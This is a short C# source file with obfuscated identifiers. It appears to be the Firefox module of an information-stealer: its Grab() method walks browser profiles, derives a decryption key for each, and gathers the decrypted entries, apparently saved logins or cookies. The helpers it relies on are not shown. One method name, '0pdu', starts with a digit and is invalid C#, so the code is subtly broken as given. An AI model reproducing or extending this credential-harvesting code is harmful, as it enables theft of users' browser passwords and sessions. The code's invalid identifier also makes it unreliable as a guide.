using System;
using System.Collections.Generic;
using C6Zy;
using Cc5oGNTD;

namespace rk937aHHc
{
	public class Firefox : EtbH
	{
		public Firefox()
		{
			this.pswNe = "";
		}

		public string pswNe { get; set; }

        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> list = new List<WTitxI2m>();

            foreach (AH9.ttg ttg in AH9.ysTcz2Li)
            {
                if (!ttg.WrHknQjA65O)
                    continue;

                byte[] key = COF.wS9grBYZnl(ttg.KZkdvgD);

                list.AddRange(COF.0pdu(key, ttg.NG21r7PAik));
                list.AddRange(COF.BMRdyTI(key, ttg.NG21r7PAik));
            }

            return list;
        }
    }
}
